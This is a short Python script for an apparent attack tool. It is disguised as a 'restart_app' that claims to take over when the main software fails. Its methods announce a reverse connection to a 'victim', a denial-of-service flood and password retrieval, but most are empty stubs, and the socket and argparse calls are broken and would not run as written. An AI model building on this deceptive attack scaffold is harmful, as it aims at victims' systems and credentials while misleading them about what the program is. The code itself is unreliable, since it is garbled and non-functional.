#from os_sniffer import *
import sys
import socket
import os, argparse

class restart_app():
    print("""If you are seeing this, this is cause of the main software failed to respond and this will take over. """)

    def __init__(self):
        self.script = None
        self.IP = sys.argv[1]
        self.PORT = sys.argv[2]
        self.sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        self.serv = self.sock
        self.network_inf = self.sock
    parser = argparse.ArgumentParser('-i' ,'--ipv4' , help='Enter the IPv4 address here')
    parser = argparse.ArgumentParser('-P' ,'--port' , help='enter the port of the local machine')
    parser.add_argument('-i', '--ipv4', help='\nThis is for the IPv4 address')
    parser.add_argument('-P','--port',help='\nThis is for the local machine\'s port.')
    args = parser.parse_args()

    def Create_Conn(self):
        print('Creating a reverse connection to victim')
        if self.sock.listen(self.IP()):
            print('[!] Connection created.')
            command = '!'
            #Add more functionality

    def Browse_Folders(self):
        os.path.exists('')
        pass
    def Print_Network_Info(self):
        print('[!] Retrieving network information')
        print(self.network_inf.getsockname())
        self.network_inf.gethostname()
        pass

    def kill_network(self):
        print('[!] Launching Denial Of Service')
        while self.sock.connect_ex(self.IP() , self.PORT() , bytes=4048):
            print('')
        self.serv.bind(self.serv.getsockname() , self.PORT)
        print('')



        pass

    def Passwd_Retrieve(self):
        print('[!] Retrieving client passwords.')
        pass


if __name__ == '__main__':
    print("\nLaunching script")
    

    
